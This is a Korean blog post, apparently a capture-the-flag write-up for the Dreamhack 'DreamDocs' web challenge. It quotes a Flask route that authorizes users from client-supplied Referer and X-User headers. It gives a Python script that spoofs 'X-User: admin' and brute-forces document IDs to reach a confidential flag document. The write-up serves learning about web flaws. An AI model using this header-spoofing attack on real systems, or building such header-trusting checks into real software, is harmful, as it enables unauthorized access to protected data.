---
layout: post
comments: true
sitemap:

title: "[CTF] Dreamhack 문제 풀이: DreamDocs"
excerpt: "불충분한 인증"

date: 2026-09-14
last_modified_at: 2026-09-14

categories: [CTF]
tags: [TIL, WEB, CTF]
---

<!-- markdownlint-disable MD010 MD025 MD029 MD033 -->

# [Dreamhack] DreamDocs

## 목차

1. [Intro](#1-intro)
2. [Code](#2-code)
    1. [`/doc/<doc_id>`](#21-docdoc_id)
    1. [`documents` 생성](#22-documents-생성)
3. [Vuln](#3-vuln)
4. [Payload](#4-payload)

---

## 1. Intro

Dreamhack 링크: <https://dreamhack.io/wargame/challenges/2325>

## 2. Code

### 2.1. `/doc/<doc_id>`

<details>
<summary>코드 접기/펼치기</summary>
<div markdown="1">

```python
@app.route('/doc/<int:doc_id>')
def view_document(doc_id):
	# 헤더에서 Referer와 X-User를 가져옴
    referer = request.headers.get('Referer', '')
    user_level = request.headers.get('X-User', 'guest')

    # doc_id가 0~999가 아니면 404
    if doc_id < 0 or doc_id >= 1000:
        abort(404)

    # documents에 doc_id가 없으면 404
    if doc_id not in documents:
        abort(404)
    
    document = documents[doc_id]

    # referer에 /share가 없을 때
    if '/share' not in referer:
        return render_template('error.html', 
            message="Access denied. Documents can only be accessed from the share page."), 403
	
	# document 분류가 confidential일 때
    if document['classification'] == 'confidential':
	    # user_level이 admin이 아니면
        if user_level != 'admin':
            return render_template('error.html', 
                message="Insufficient privileges. Administrator access required."), 403
    # document 분류가 internal일 때
    elif document['classification'] == 'internal':
	    # user_level이 guest이면
        if user_level == 'guest':
            return render_template('error.html', 
                message="Internal documents require user authentication."), 401
    
    return render_template('document.html', doc=document, doc_id=doc_id)
```

</div>
</details>

1. Request Header에서 `Referer`와 `X-User`(기본값: guest)를 가져온다.
2. doc_id가 유효한지 확인한다.
3. `Referer`가 `/share`인지 확인한다.
4. document의 분류에 따라 권한을 확인한다.

### 2.2. `documents` 생성

<details>
<summary>코드 접기/펼치기</summary>
<div markdown="1">

```python
# flag가 담겨 있는 문서의 id는 100~999 사이 랜덤값
flag_doc_id = random.randint(100, 999)

documents = {
    flag_doc_id: {
        'title': 'Confidential Report - Access Restricted',
        'content': f'This is a confidential internal document.\n\nDocument ID: {flag_doc_id}\nClassification: TOP SECRET\n\n<!-- FLAG: {FLAG} -->\n\nThis document contains sensitive information and should only be accessed by authorized personnel.',
        'classification': 'confidential',
        'author': 'System Administrator'
    }
}

for i in range(1000):
    if i not in documents:
        uid = random.randint(0, 9)
        documents[i] = {
            'title': f'Document #{i:03d}',
            'content': f'This is document number {i}.\n\nContent: Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.\n\nDocument ID: {i}\nCreated: 2025-01-{(i % 28) + 1:02d}\nAuthor: User{uid}',
            'classification': 'public' if random.randint(0, 2) == 0 else 'internal',
            'author': f'User{uid}'
        }
```

</div>
</details>

- 100~999 사이에 flag가 랜덤으로 생성됨

## 3. Vuln

불충분한 인증

## 4. Payload

1. 자동화 공격

    <details>
    <summary>코드 접기/펼치기</summary>
    <div markdown="1">

    ```python
    import requests
    from bs4 import BeautifulSoup as bs

    for doc_id in range(100, 1000):
        url = f"http://<드림핵 문제 주소>/doc/{doc_id}"
        
        # X-User
        headers = {
            "X-User": "admin",
            "Referer": "http://<드림핵 문제 주소>/share"
        }

        response = requests.get(
            url,
            headers=headers,
            timeout=10
        )

        soup = bs(response.text, "html.parser")
        element = soup.select_one("span.classification")

        if element:
            classification = element.get_text(strip=True)
            if classification.lower() == 'confidential':
                print("Classification:", classification)
                break
    ```

    </div>
    </details>

    ![Captured Image](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-15-17-46.png)
    - `276`이 flag가 담겨져 있는 문서임을 확인
2. Burp Suite를 이용해 헤더값 변경 후 요청
	![Captured Image](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-15-18-22.png)
3. flag 획득
	![Captured Image](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-15-18-49.png)
